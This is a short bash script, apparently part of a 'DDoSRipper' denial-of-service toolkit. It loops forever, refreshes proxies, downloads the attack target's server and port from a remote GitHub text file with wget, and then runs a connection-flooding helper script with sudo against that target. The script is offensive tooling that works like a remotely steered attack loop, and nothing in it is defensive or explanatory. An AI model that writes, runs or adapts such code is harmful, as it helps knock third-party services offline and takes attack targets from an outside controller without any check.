#!/bin/bash

YELLOW='\033[0;33m'
NC='\033[0m' # No Color

while getopts s:p:t:o: flag
do
    case "${flag}" in
        s) server=${OPTARG};;
        p) port=${OPTARG};;
        t) turbo=${OPTARG};;
	o) timeout=${OPTARG};;
    esac
done

while :
do
    sudo ./updateproxies.sh
    
    if [ -z "$server" ] || [ -z $port ]; then
        echo -e "${YELLOW}GET target from GIT${NC}"
        lns=$(wget -qO- https://raw.githubusercontent.com/GiDRaPiTaRdA/DDoSRipper/master/automation/target.txt)

        IFS=$'\n' read -d '' -r -a lines <<< $lns

        server=${lines[0]}
        port=${lines[1]}

        echo "Server ${server}:${port}"
    fi

    sudo timeout ${timeout} ./loopconnect.sh -t $turbo -p $port -s $server
done
